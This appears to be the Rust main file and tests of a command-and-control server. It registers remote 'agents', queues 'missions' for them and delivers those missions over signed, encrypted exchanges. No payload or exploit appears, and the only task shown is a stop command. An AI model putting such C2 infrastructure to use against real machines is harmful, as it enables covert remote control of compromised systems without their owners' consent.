use std::{
    collections::HashMap,
    sync::{Arc, Mutex},
};

use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::crypto::{self, SigningKey};
use error::C2Result;
use tower_http::trace::TraceLayer;
use tracing::info;

pub(crate) mod error;
mod routes;
mod services;

pub const IDENTITY: &str = include_str!("../../c2.id");

#[derive(Clone)]
pub struct C2State {
    pub signing_key: SigningKey,
    pub conn: ThreadSafeConnection,
    pub ephemeral_private_keys: Arc<Mutex<HashMap<i32, crypto::KeyExchangePrivateKey>>>,
}

unsafe impl Send for C2State {}
unsafe impl Sync for C2State {}

// Reason for this: https://www.reddit.com/r/rust/comments/pnzple/comment/hct59dj/
// "In general, I recommend that you never lock the standard library mutex from async functions.
// Instead, create a non-async function that locks it and accesses it, then call that non-async function from your async code."
pub type ThreadSafeConnection = Arc<Mutex<rusqlite::Connection>>;

#[tokio::main]
async fn main() -> C2Result<()> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::DEBUG)
        .event_format(
            tracing_subscriber::fmt::format()
                .with_file(true)
                .with_line_number(true),
        )
        .init();
    info!(" ░▒▓██████▓▒░░▒▓███████▓▒░ ");
    info!("░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░");
    info!("░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░       ░▒▓██████▓▒░ ");
    info!("░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       ");
    info!(" ░▒▓██████▓▒░░▒▓████████▓▒░");

    let signing_key = crypto::get_signing_key_from(
        BASE64_STANDARD
            .decode(IDENTITY)
            .unwrap()
            .as_slice()
            .try_into()
            .unwrap(),
    );

    // Migration https://github.com/launchbadge/sqlx/blob/main/sqlx-cli/README.md
    let conn = rusqlite::Connection::open("c2.db")?;

    let ephemeral_private_keys = HashMap::new();

    let app = app(C2State {
        signing_key,
        conn: Arc::new(Mutex::new(conn)),
        ephemeral_private_keys: Arc::new(Mutex::new(ephemeral_private_keys)),
    });

    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000").await?;
    Ok(axum::serve(listener, app).await?)
}

fn app(state: C2State) -> axum::Router {
    routes::init_router()
        .layer(TraceLayer::new_for_http())
        // .layer(DefaultBodyLimit::max(2048))
        .with_state(state)
}

#[cfg(test)]
mod tests {
    use std::sync::Once;

    use super::*;
    use axum::{
        body::Body,
        http::{header, Method, StatusCode},
    };
    use common::{model, PLATFORM, PLATFORM_HEADER};
    use http_body_util::BodyExt;
    use tower::ServiceExt;

    type OsefResult = Result<(), Box<dyn std::error::Error>>;

    static INIT: Once = Once::new();

    fn state() -> Result<C2State, Box<dyn std::error::Error>> {
        INIT.call_once(|| {
            tracing_subscriber::fmt()
                .with_max_level(tracing::Level::DEBUG)
                .event_format(
                    tracing_subscriber::fmt::format()
                        .with_file(true)
                        .with_line_number(true),
                )
                .init();
        });

        let signing_key =
            crypto::get_signing_key_from(BASE64_STANDARD.decode(IDENTITY)?.as_slice().try_into()?);

        let conn = rusqlite::Connection::open_in_memory()?;

        conn.execute("PRAGMA foreign_keys = ON", [])?;

        conn.execute(
            "CREATE TABLE IF NOT EXISTS agents (
        id INTEGER PRIMARY KEY,
        name TEXT UNIQUE NOT NULL,
        identity BLOB UNIQUE NOT NULL,
        platform TEXT NOT NULL,
        created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
        last_seen_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
    )",
            [],
        )?;

        conn.execute(
            "CREATE TABLE IF NOT EXISTS missions (
        id INTEGER PRIMARY KEY,
        agent_id INTEGER NOT NULL,
        task STRING NOT NULL,
        result STRING,
        issued_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
        completed_at TIMESTAMP,
        FOREIGN KEY (agent_id) REFERENCES agents (id)
    )",
            [],
        )?;

        // conn.execute(
        //     &fs::read_to_string("migrations/20240609105900_hello.up.sql")?,
        //     [],
        // )?;

        Ok(C2State {
            signing_key,
            conn: Arc::new(Mutex::new(conn)),
            ephemeral_private_keys: Arc::new(Mutex::new(HashMap::new())),
        })
    }

    #[tokio::test]
    async fn test_get_no_agents() -> OsefResult {
        let response = app(state()?)
            .oneshot(
                axum::http::Request::builder()
                    .method(Method::GET)
                    .uri("/agents")
                    .body(Body::empty())?,
            )
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        let body = response.into_body().collect().await?.to_bytes();
        let agents = serde_json::from_slice::<Vec<model::Agent>>(&body)?;
        assert!(agents.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn test_get_agents() -> OsefResult {
        let state = state()?;
        vec![
            model::Agent {
                id: 1,
                name: "Agent 1".to_string(),
                identity: crypto::get_signing_key().verifying_key(),
                platform: Default::default(),
                created_at: chrono::Utc::now(),
                last_seen_at: chrono::Utc::now(),
            },
            model::Agent {
                id: 2,
                name: "Agent 2".to_string(),
                identity: crypto::get_signing_key().verifying_key(),
                platform: Default::default(),
                created_at: chrono::Utc::now(),
                last_seen_at: chrono::Utc::now(),
            },
        ]
        .into_iter()
        .for_each(|agent| {
            services::agents::create(
                state.conn.clone(),
                &agent.name,
                agent.identity,
                agent.platform,
            )
            .unwrap();
        });

        let response = app(state.clone())
            .oneshot(
                axum::http::Request::builder()
                    .method(Method::GET)
                    .uri("/agents")
                    .body(Body::empty())?,
            )
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        let body = response.into_body().collect().await?.to_bytes();
        let agents = serde_json::from_slice::<Vec<model::Agent>>(&body)?;
        assert_eq!(agents.len(), 2);
        Ok(())
    }

    #[tokio::test]
    async fn test_init_new_agent() -> OsefResult {
        let state = state()?;
        let mut signing_key = crypto::get_signing_key();
        let (_private_key, crypto_negociation) = model::CryptoNegociation::new(&mut signing_key);

        let response = app(state.clone())
            .oneshot(
                axum::http::Request::builder()
                    .method(Method::GET)
                    .uri("/missions")
                    .header(PLATFORM_HEADER, PLATFORM.to_string())
                    .header(header::CONTENT_TYPE, "application/json")
                    .body(Body::from(serde_json::to_string(&crypto_negociation)?))?,
            )
            .await?;

        assert_eq!(response.status(), StatusCode::NO_CONTENT);
        let agents = services::agents::get(state.conn.clone())?;
        assert_eq!(agents.len(), 1);
        let agent = &agents[0];
        assert_eq!(agent.identity, signing_key.verifying_key());
        Ok(())
    }

    #[tokio::test]
    async fn test_create_mission() -> OsefResult {
        let state = state()?;
        let signing_key = crypto::get_signing_key();

        let agent = services::agents::create(
            state.conn.clone(),
            "Michel c'est le Brésil",
            signing_key.verifying_key(),
            model::Platform::default(),
        )?;

        let response = app(state.clone())
            .oneshot(
                axum::http::Request::builder()
                    .method(Method::POST)
                    .uri("/missions")
                    .header(header::CONTENT_TYPE, "application/json")
                    .body(Body::from(serde_json::to_string(&model::Mission {
                        id: Default::default(),
                        agent_id: agent.id,
                        task: model::Task::Stop,
                        result: None,
                        issued_at: Default::default(),
                        completed_at: None,
                    })?))?,
            )
            .await?;

        assert_eq!(response.status(), StatusCode::CREATED);
        let mission = services::missions::get_next(state.conn.clone(), agent.id)?;
        assert!(mission.is_some());
        let Some(mission) = mission else {
            panic!("Mission not found");
        };
        assert_eq!(mission.agent_id, agent.id);
        Ok(())
    }

    #[tokio::test]
    async fn test_get_next_mission() -> OsefResult {
        let state = state()?;
        let mut signing_key = crypto::get_signing_key();

        let agent = services::agents::create(
            state.conn.clone(),
            "Michel c'est le Brésil",
            signing_key.verifying_key(),
            model::Platform::default(),
        )?;

        services::missions::create(state.conn.clone(), agent.id, model::Task::Stop)?;

        let (private_key, crypto_negociation) = model::CryptoNegociation::new(&mut signing_key);

        let response = app(state.clone())
            .oneshot(
                axum::http::Request::builder()
                    .method(Method::GET)
                    .uri("/missions")
                    .header(PLATFORM_HEADER, PLATFORM.to_string())
                    .header(header::CONTENT_TYPE, "application/json")
                    .body(Body::from(serde_json::to_string(&crypto_negociation)?))?,
            )
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        let body = response.into_body().collect().await?.to_bytes();
        let crypto_message = serde_json::from_slice::<model::CryptoMessage>(&body)?;
        let mission =
            serde_json::from_slice::<model::Mission>(&crypto_message.decrypt(private_key)?)?;
        assert_eq!(mission.agent_id, agent.id);
        Ok(())
    }
}
